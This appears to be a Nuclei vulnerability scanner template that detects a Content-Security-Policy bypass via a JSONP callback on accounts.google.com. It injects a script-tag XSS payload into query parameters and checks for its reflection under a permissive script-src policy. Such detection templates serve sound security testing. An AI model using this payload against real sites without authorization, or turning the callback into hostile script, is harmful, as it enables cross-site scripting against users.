id: google-accounts-csp-xss

info:
  name: Content-Security-Policy Bypass via Google Accounts
  author: DhiyaneshDK
  severity: high
  reference:
    - https://github.com/renniepak/CSPBypass/blob/0b4c8aee52497d660adce7a6d67311a73383818c/data.tsv#L7C21-L7C109
  metadata:
    verified: true
  tags: xss,csp-bypass,google

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{injection}}"

      - type: word
        part: content_type
        words:
          - "text/html"

      - type: word
        part: content_security_policy
        words:
          - "accounts.google.com"
          - "script-src"
        condition: and